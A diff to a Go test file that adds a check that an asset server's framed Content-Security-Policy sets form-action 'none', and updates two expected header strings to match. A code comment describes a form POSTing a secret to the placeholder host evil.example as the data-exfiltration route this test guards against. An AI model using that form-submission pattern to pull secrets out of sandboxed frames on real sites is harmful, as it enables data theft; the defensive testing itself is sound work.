@@ -105,6 +105,67 @@ func TestAssetServerFramedIsolationDirectives(t *testing.T) {
 	}
 }
 
+// TestFramedCSPSealsFormAction pins that the framed policy answers "none"
+// to form-action even though allow-forms is a grantable sandbox token. A
+// frame that can submit forms can move data out by navigation:
+// <form method=post action=https://evil.example> with a secret in a field.
+// Submission is navigation, not fetch, so connect-src 'none' — which the
+// framedCSP docs call "the real exfiltration guard" — never sees it, and
+// CSP's form-action has NO fallback to default-src: an absent directive
+// means unrestricted.
+//
+// Mitigation today: framedCSP's sandbox directive is a fixed
+// "sandbox allow-scripts", and a document framed with BOTH an iframe
+// sandbox attribute and a CSP sandbox directive complies with the union of
+// their restrictions, so the allow-forms grant is currently inert and forms
+// are blocked anyway. That seal is incidental — it holds only while the CSP
+// sandbox token set never grows, and allowedSandboxTokens exists precisely
+// to grow grants deliberately. form-action 'none' makes the seal intrinsic
+// to the policy.
+//
+// A production fix that appends "; form-action 'none'" to framedCSP MUST
+// update the two byte-identical pins in this file —
+// TestFramedCSPWasmTierScriptSrcOnly and TestFramedCSPDefaultByteIdentical
+// — by adding the directive to their want strings. That contract change
+// belongs to the fix commit, not to this test.
+func TestFramedCSPSealsFormAction(t *testing.T) {
+	// The grant is legal: a third-party manifest may carry allow-forms, and
+	// SandboxString (the authoritative iframe attribute) preserves it.
+	m := Manifest{
+		Entry:   "/__p/editor.html",
+		Sandbox: []string{"allow-scripts", "allow-forms"},
+	}
+	if err := m.Validate(); err != nil {
+		t.Fatalf("allow-forms is a grantable token, Validate must accept it: %v", err)
+	}
+	if sb := m.SandboxString(); !strings.Contains(sb, "allow-forms") {
+		t.Fatalf("SandboxString must carry the grant to the iframe attribute, got %q", sb)
+	}
+
+	// Demonstrate at the emission sink: the header the browser enforces on
+	// the framed document.
+	fsys := fstest.MapFS{
+		"editor.html": &fstest.MapFile{Data: []byte("<!doctype html><p>frame")},
+	}
+	srv := NewAssetServer(fsys, "/__p", []AssetSpec{
+		{Name: "editor.html", ContentType: "text/html; charset=utf-8", Framed: true},
+	})
+	rt := router.New()
+	srv.Register(rt)
+	hs := httptest.NewServer(rt)
+	defer hs.Close()
+
+	resp, err := http.Get(hs.URL + "/__p/editor.html")
+	if err != nil {
+		t.Fatalf("GET editor.html: %v", err)
+	}
+	resp.Body.Close()
+	csp := resp.Header.Get("Content-Security-Policy")
+	if !strings.Contains(csp, "form-action 'none'") {
+		t.Errorf("SECURITY: framed CSP leaves form-action unset while allow-forms is grantable — a frame granted forms can POST secrets to any origin by navigation, which connect-src 'none' cannot see: %q", csp)
+	}
+}
+
 // A request whose scheme/host would inject a CSP directive must be refused,
 // not served with a poisoned policy.
 func TestAssetServerRejectsOriginInjection(t *testing.T) {
@@ -179,6 +240,7 @@ func TestFramedCSPWasmTierScriptSrcOnly(t *testing.T) {
 		"; img-src http://h data:" +
 		"; font-src http://h data:" +
 		"; connect-src 'none'" +
+		"; form-action 'none'" +
 		"; frame-ancestors http://h" +
 		"; base-uri http://h"
 	if got != want {
@@ -188,7 +250,10 @@ func TestFramedCSPWasmTierScriptSrcOnly(t *testing.T) {
 
 // A manifest with no CSP tokens must produce byte-for-byte the header the
 // platform served before the tier existed; the default path cannot drift,
-// not even by a trailing space.
+// not even by a trailing space. (form-action 'none' joined the baseline
+// when TestFramedCSPSealsFormAction landed: a frame granted allow-forms
+// POSTs by navigating, which connect-src cannot see. It is part of the
+// default now, so the tier still must not change it.)
 func TestFramedCSPDefaultByteIdentical(t *testing.T) {
 	want := "sandbox allow-scripts" +
 		"; default-src http://h" +
@@ -197,6 +262,7 @@ func TestFramedCSPDefaultByteIdentical(t *testing.T) {
 		"; img-src http://h data:" +
 		"; font-src http://h data:" +
 		"; connect-src 'none'" +
+		"; form-action 'none'" +
 		"; frame-ancestors http://h" +
 		"; base-uri http://h"
 	for _, csp := range [][]string{nil, {}} {
